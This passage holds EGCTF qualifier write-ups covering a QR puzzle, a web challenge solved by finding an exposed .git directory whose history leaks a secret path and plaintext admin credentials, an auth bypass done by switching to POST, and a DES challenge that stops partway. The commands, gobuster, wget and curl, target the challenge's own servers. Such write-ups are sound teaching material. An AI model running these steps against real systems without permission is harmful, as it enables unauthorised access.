<h2 id="Misc-QR-c0d3"><a href="#Misc-QR-c0d3" class="headerlink" title="Misc: QR c0d3"></a>Misc: QR c0d3</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I tried so hard and got so far but in the end I have nothing to try. Can you help me read this QR code</span><br><span class="line"></span><br><span class="line">Flag format EGCTF&#123;$0m3_l337_73x7&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given an image called <code>QR.png</code>:<br><img src="/images/ctfs/egctf-qual/10QR.png" alt=""><br>I used <a href="https://www.onlinebarcodereader.com/" target="_blank" rel="noopener">onlinebarcodereader.com</a> to read the qr code, but I only got a small part of the flag:<br><img src="/images/ctfs/egctf-qual/2.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R_c0d3$_!$_n07_4n_34$y_74$k&#125; 3nd_0f_Fl49 .</span><br></pre></td></tr></table></figure>
<p>I tried rotating the image by 90 degrees to see if I’ll get any different results, which actually worked:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR.png -rotate 90 QR_2.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3#</span><br></pre></td></tr></table></figure>
<p><code>QR_2.png</code>:<br><img src="/images/ctfs/egctf-qual/11QR_2.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/4.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/5.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7h!5 m355493. Th3 fl49 !5 EGCTF&#123;m3r9!n9_ Q</span><br></pre></td></tr></table></figure>
<p>Let’s get the other 2 images:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR_2.png -rotate 90 QR_3.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3# convert QR_3.png -rotate 90 QR_4.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;misc&#x2F;QR-c0d3#</span><br></pre></td></tr></table></figure>
<p><code>QR_3.png</code>:<br><img src="/images/ctfs/egctf-qual/12QR_3.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/6.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/7.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3ll0. Th!5 !5 4 m355493 fr0m 39yp7. Y0u n</span><br></pre></td></tr></table></figure>
<p><code>QR_4.png</code>:<br><img src="/images/ctfs/egctf-qual/13QR_4.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/8.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33d m0r3 7h4n 4 QR c0d3 5c4nn3r 70 d3c0d3</span><br></pre></td></tr></table></figure>
<p>Final message:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3ll0. Th!5 !5 4 m355493 fr0m 39yp7. Y0u n33d m0r3 7h4n 4 QR c0d3 5c4nn3r 70 d3c0d3 7h!5 m355493. Th3 fl49 !5 EGCTF&#123;m3r9!n9_ QR_c0d3$_!$_n07_4n_34$y_74$k&#125; 3nd_0f_Fl49 .</span><br></pre></td></tr></table></figure>


<h2 id="Web-Hold-Up"><a href="#Web-Hold-Up" class="headerlink" title="Web: Hold Up"></a>Web: Hold Up</h2><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I never set out to be weird. It was always other people who called me weird.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.105.76.128&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><p>The index page only had an image saying “SITE UNDER CONSTRUCTION” and nothing else:<br><img src="/images/ctfs/egctf-qual/14.png" alt=""><br>I ran <code>gobuster</code> to check for sub directories and found a <code>git</code> directory:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# gobuster -u http:&#x2F;&#x2F;172.105.76.128&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;172.105.76.128&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 21:22:42 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.git&#x2F;HEAD (Status: 200)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;16 21:23:22 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up#</span><br></pre></td></tr></table></figure>
<p><code>/.git</code>:<br><img src="/images/ctfs/egctf-qual/15.png" alt=""><br>I used <code>wget</code> to download it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# mkdir git</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up# cd git&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# wget -r http:&#x2F;&#x2F;172.105.76.128&#x2F;.git&#x2F;</span><br><span class="line">---</span><br><span class="line">FINISHED --2019-11-16 21:25:20--</span><br><span class="line">Total wall clock time: 1m 21s</span><br><span class="line">Downloaded: 465 files, 712K in 0.9s (774 KB&#x2F;s)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 16 21:23 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 16 21:25 ..</span><br><span class="line">drwxr-xr-x 4 root root 4096 Nov 16 21:24 172.105.76.128</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git# cd 172.105.76.128&#x2F;.git&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# ls -la</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x  8 root root 4096 Nov 16 21:24  .</span><br><span class="line">drwxr-xr-x  4 root root 4096 Nov 16 21:24  ..</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  branches</span><br><span class="line">-rw-r--r--  1 root root    9 Nov 15 02:08  COMMIT_EDITMSG</span><br><span class="line">-rw-r--r--  1 root root   92 Nov 15 02:08  config</span><br><span class="line">-rw-r--r--  1 root root   73 Nov 15 02:08  description</span><br><span class="line">-rw-r--r--  1 root root   23 Nov 15 02:08  HEAD</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  hooks</span><br><span class="line">-rw-r--r--  1 root root  356 Nov 15 02:08  index</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23  index.html</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;D;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;D;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;M;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;M;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;N;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;N;O&#x3D;D&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:23 &#39;index.html?C&#x3D;S;O&#x3D;A&#39;</span><br><span class="line">-rw-r--r--  1 root root 2880 Nov 16 21:24 &#39;index.html?C&#x3D;S;O&#x3D;D&#39;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Nov 16 21:24  info</span><br><span class="line">drwxr-xr-x  3 root root 4096 Nov 16 21:24  logs</span><br><span class="line">drwxr-xr-x 36 root root 4096 Nov 16 21:24  objects</span><br><span class="line">drwxr-xr-x  4 root root 4096 Nov 16 21:25  refs</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure>
<p>I checked the <code>reflog</code> to see the commits:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git reflog </span><br><span class="line">2e3e1a8 (HEAD -&gt; master) HEAD@&#123;0&#125;: commit: Refining</span><br><span class="line">89329fa HEAD@&#123;1&#125;: commit: NewFeature</span><br><span class="line">dfecece HEAD@&#123;2&#125;: commit: Addinfo</span><br><span class="line">b032cf8 HEAD@&#123;3&#125;: commit: Disable</span><br><span class="line">5b9e491 HEAD@&#123;4&#125;: commit: DelCr</span><br><span class="line">457168f HEAD@&#123;5&#125;: commit: AddUsetting</span><br><span class="line">b55d897 HEAD@&#123;6&#125;: commit: editconf</span><br><span class="line">70ae358 HEAD@&#123;7&#125;: commit (initial): initials</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure>
<p>The commit <code>NewFeature (89329fa)</code> revealed a secret path (<code>/S3cR3tPaTh</code>):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git show 2e3e1a8</span><br><span class="line">commit 2e3e1a8c124768ecbb31e92d5c070003924b9254 (HEAD -&gt; master)</span><br><span class="line">Author: Ben ALaa &lt;a.alaa@egcert.eg&gt;</span><br><span class="line">Date:   Thu Nov 14 23:18:26 2019 +0100</span><br><span class="line"></span><br><span class="line">    Refining</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;S3cR3tPaTh&#x2F;config.php b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">index 3d7f801..706d93b 100644</span><br><span class="line">--- a&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">+++ b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">@@ -419,15 +419,6 @@ $CONFIG &#x3D; array(</span><br><span class="line">  *&#x2F;</span><br><span class="line"> &#39;overwriteprotocol&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line"> </span><br><span class="line">-&#x2F;**</span><br><span class="line">- * Override webroot</span><br><span class="line">- * ownCloud attempts to detect the webroot for generating URLs automatically.</span><br><span class="line">- * For example, if &#96;www.example.com&#x2F;owncloud&#96; is the URL pointing to the</span><br><span class="line">- * ownCloud instance, the webroot is &#96;&#x2F;owncloud&#96;. When proxies are in use, it</span><br><span class="line">- * may be difficult for ownCloud to detect this parameter, resulting in invalid URLs.</span><br><span class="line">- *&#x2F;</span><br><span class="line">-&#39;overwritewebroot&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">-</span><br><span class="line"> &#x2F;**</span><br><span class="line">  * Override condition</span><br><span class="line">  * This option allows you to define a manual override condition as a regular</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure>
<p><code>/S3cR3tPaTh</code>:<br><img src="/images/ctfs/egctf-qual/16.png" alt=""><br>I could also find the credentials in one of the commits (<code>DelCr (5b9e491)</code>):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git# git show 5b9e491</span><br><span class="line">commit 5b9e491802d53d6af1ef25206ccb0765b64a248b</span><br><span class="line">Author: Ben ALaa &lt;a.alaa@egcert.eg&gt;</span><br><span class="line">Date:   Thu Nov 14 23:15:11 2019 +0100</span><br><span class="line"></span><br><span class="line">    DelCr</span><br><span class="line"></span><br><span class="line">diff --git a&#x2F;S3cR3tPaTh&#x2F;config.php b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">index 46ed4f3..72e9842 100644</span><br><span class="line">--- a&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">+++ b&#x2F;S3cR3tPaTh&#x2F;config.php</span><br><span class="line">@@ -194,7 +194,7 @@ $CONFIG &#x3D; array(</span><br><span class="line"> &#39;knowledgebaseenabled&#39; &#x3D;&gt; true,</span><br><span class="line"></span><br><span class="line"> &#x2F;**</span><br><span class="line">- * Enables or disables avatars or user profile photos</span><br><span class="line">+ &#x2F;* Enables or disables avatars or user profile photos</span><br><span class="line">  * &#96;true&#96; enables avatars, or user profile photos, &#96;false&#96; disables them.</span><br><span class="line">  * These appear on the User page, on user&#39;s Personal pages and are used by some apps</span><br><span class="line">  * (contacts, mail, etc).</span><br><span class="line">@@ -469,15 +469,7 @@ $CONFIG &#x3D; array(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">-&#x2F;**</span><br><span class="line">-* Admin Credentials</span><br><span class="line">-**&#x2F;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-&#39;Admin_Login&#39; &#x3D;&gt; &#39;Administrator&#39;</span><br><span class="line">-&#39;Admin_Password&#39; &#x3D;&gt; &#39;FN3ym@bZNaF&amp;&#39;</span><br><span class="line">-</span><br><span class="line">+&#x2F;** Delete Admin creds. **&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#x2F;**</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;hold-up&#x2F;git&#x2F;172.105.76.128&#x2F;.git#</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctfs/egctf-qual/17.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/18.png" alt=""></p>
<h2 id="Web-Tamp3rat0r"><a href="#Web-Tamp3rat0r" class="headerlink" title="Web: Tamp3rat0r"></a>Web: Tamp3rat0r</h2><h3 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Some one hacked us, we are sure that our password is so strong!</span><br><span class="line">We&#39;ve no idea what&#39;s happening!</span><br><span class="line">Can you check if our security is solid or not!</span><br><span class="line">http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><p>This was the easiest web challenge, by visiting the site we get asked for authentication:<br><img src="/images/ctfs/egctf-qual/19.png" alt=""><br>As the description said, the password is strong so bruteforcing the basic auth is not the solution, the challenge name is <code>Tamp3rat0r</code> so I tried tampering with the request method:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r# curl http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;401 Unauthorized&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Unauthorized&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;This server could not verify that you</span><br><span class="line">are authorized to access the document</span><br><span class="line">requested.  Either you supplied the wrong</span><br><span class="line">credentials (e.g., bad password), or your</span><br><span class="line">browser doesn&#39;t understand how to supply</span><br><span class="line">the credentials required.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;address&gt;Apache&#x2F;2.4.29 (Ubuntu) Server at 167.71.248.246 Port 80&lt;&#x2F;address&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r# curl -X POST http:&#x2F;&#x2F;167.71.248.246&#x2F;secure&#x2F;</span><br><span class="line">our secret flag is: EGCTF&#123;0xc7d22f_is_a_t4mp3rat0r&#125;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;web&#x2F;Tamp3rat0r#</span><br></pre></td></tr></table></figure>


<h2 id="Crypto-Des-amies"><a href="#Crypto-Des-amies" class="headerlink" title="Crypto: Des amies"></a>Crypto: Des amies</h2><h3 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 167.71.93.117 9000</span><br></pre></td></tr></table></figure>
<h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint:"></a>Hint:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strong key!</span><br></pre></td></tr></table></figure>
<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><p>By connecting to that port we get asked for a name, then we get an encrypted output:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# nc 167.71.93.117 9000</span><br><span class="line">Name: test</span><br><span class="line">Here is your personalized message: Mi!</span><br><span class="line">                                      Itqq2@QRI,ƮG@0M\a&quot;?K4$y   N</span><br><span class="line">t-4QV</span><br><span class="line">     ]Khe-װWa58ky</span><br><span class="line"></span><br><span class="line">Bye</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure>
<p>From the challenge name I assumed that the message is <code>DES</code> encrypted so I tried getting an encrypted message then sending it back again to see if I’ll get the decrypted result.<br>I sent <code>1</code>, then I saved the output to a file and called it <code>out.1</code></p>
